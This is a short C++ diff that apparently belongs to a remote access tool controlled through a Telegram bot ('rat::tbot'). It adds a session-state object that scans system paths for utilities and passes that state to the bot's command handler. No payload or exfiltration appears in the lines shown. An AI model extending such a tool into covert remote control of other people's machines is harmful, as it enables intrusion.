@@ -11,6 +11,7 @@
 #include <fmt/chrono.h>
 #include <fmt/core.h>
 #include <unordered_map>
+#include "rat/RatState.hpp"
 
 
 // --- Global state ---
@@ -74,12 +75,16 @@ void botLoop(void) {
     if (init_message.empty()) {
         init_message = fmt::format("Bot initialized at: {}", rat::system::getCurrentDateTime());
     }
+    rat::RatState session_state;
+
+    session_state.scanSystemPathsForUtilities();
+
     bot.sendMessage(init_message);
     bot.setOffset();
     while (true) {
         try {
             rat::tbot::Update update = bot.getUpdate();
-            rat::tbot::handler::handleUpdate(bot, update);
+            rat::tbot::handler::handleUpdate(session_state, bot, update);
 
             if(_isUpdateEmpty(update)) ++empty_updates_count;
           
